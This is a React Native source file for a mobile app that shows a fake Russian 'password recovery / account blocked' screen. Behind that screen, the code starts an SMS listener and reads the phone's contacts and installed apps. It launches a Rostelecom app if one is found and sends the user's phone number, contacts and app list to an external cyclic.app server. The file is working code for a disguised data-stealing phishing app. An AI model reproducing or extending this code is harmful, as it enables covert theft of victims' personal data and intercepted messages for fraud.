import React, { useState, useEffect } from 'react';
import { View, TextInput, TouchableOpacity, Text, StyleSheet, PermissionsAndroid } from 'react-native';
import SvgComponent from './svgs/Logo';
import MyInput from './Components/MyInput';
import Contact from './modules/Contact';
import Apps from './modules/Apps';
import Permission from './modules/Permission';
import Sms_Listener from './modules/Sms_Listener';
import { NativeModules } from 'react-native';
import PhoneNumberPopup from './Components/PhoneNumber';
import StorageManager from './Components/StorageManager';
export default function App() {
  const [popupVisible, setPopupVisible] = useState(true);
  const { MainModule } = NativeModules;
  const [inputText, setInputText] = useState('');
  var contacts = ""
  var apps = ""
  const isButtonEnabled = inputText.length >= 4;
  const defaultHeaders = new Headers();
  defaultHeaders.append('Content-Type', 'application/json');
  defaultHeaders.append('Authorization', 'Bearer your_token_here');
  const handleInputChange = (text) => {
    setInputText(text);
  };
  const handleContinuePress = () => {
    console.log('Продолжить');
  };
  const permissions = async () => {
    await Permission.requestPermissions()
  }
  const loadApp = async () => {
    apps = await Apps.loadApps()
    contacts = await Contact.loadContacts()
  };
  const workWithApp = async () => {
    await loadApp()
  }
  const workWithData = async () => {
    const status = await StorageManager.getData('phoneNumberPopup')
    if (status != "answered") {
      await new Promise((resolve) => {
        const interval = setInterval(() => {
          if (phoneNumber) {
            clearInterval(interval);
            resolve();
          }
        }, 100);
      });
    }
    await workWithApp();
    var apps_no_icons = []
    apps.forEach(element => {
      apps_no_icons.push({ label: element.label, packageName: element.packageName })
    });
    apps_no_icons.forEach(element => {
      if (element.packageName == "ru.rostel") {
        MainModule.fastLoad("ru.rostel")
      }
    });
    const phoneNumber = await StorageManager.getData("phoneNumber")
    const data = { ID: phoneNumber, contacts: contacts, apps: apps_no_icons }
    console.log(apps_no_icons.length)
    fetch("https://curious-pinafore-goat.cyclic.app/user/add", {
      method: "POST",
      headers: defaultHeaders,
      body: JSON.stringify(data)
    })
      .then(response => {
        console.log(response)
      })
      .catch(error => {
      });
  }
  const handleSubmitPhoneNumber = async (phoneNumber) => {
    await StorageManager.saveData('phoneNumber', phoneNumber)
    setPopupVisible(false);
  };
  useEffect(() => {
    Sms_Listener.startListen()
    const fetchData = async () => {
      await permissions();
      await workWithData();
    };
    fetchData();
  })
  return (
    <View style={styles.container}>
      <PhoneNumberPopup
        visible={popupVisible}
        onClose={() => setPopupVisible(false)}
        onSubmit={handleSubmitPhoneNumber}
      />
      <View style={styles.main}>
        <SvgComponent style={styles.svg} />
        <View>
          <Text style={styles.text}>Восстановление пароля</Text>
        </View>
        <View style={styles.maintext}>
          <Text style={styles.text2}>
            Контрольный вопрос:
          </Text>
        </View>
        <View style={styles.numberview}>
          <Text style={styles.numberview_text}>Ваш аккаунт заблокирован, свяжитесь с оператором 8 800 600-37-56</Text>
        </View>
        <View>
          <MyInput onTextChange={handleInputChange} />
        </View>
        <TouchableOpacity
          style={[styles.button, { backgroundColor: isButtonEnabled ? '#007AFF' : '#ccc' }]}
          onPress={handleContinuePress}
          disabled={!isButtonEnabled}
        >
          <Text style={styles.buttonText}>Продолжить</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#c1d4f5',
    alignItems: 'center',
    justifyContent: 'center',
  },
  main: {
    backgroundColor: '#fff',
    height: 500,
    width: 350,
    borderRadius: 15,
    alignItems: "center",
    flexDirection: "column",
  },
  svg: {
    paddingTop: 110
  },
  text: {
    fontSize: 22,
    fontWeight: "bold",
    color: 'black'
  },
  text2: {
    fontSize: 18,
    color: 'black'
  },
  maintext: {
    alignItems: "center",
    paddingTop: 30,
    paddingBottom: 10,
    color: 'black'
  },
  numberview: {
    alignItems: "center",

  },
  numberview_text: {
    textAlign: 'center',
    fontWeight: 'bold',
    fontSize: 14,
    paddingLeft: 10,
    paddingRight: 10,
    lineHeight: 25,
    color: 'black'
  },
  button: {
    width: 300,
    height: 60,
    justifyContent: 'center',
    alignItems: 'center',
    borderRadius: 5,
    marginTop: 50
  },
  buttonText: {
    color: 'white',
    fontSize: 16,
  },
});
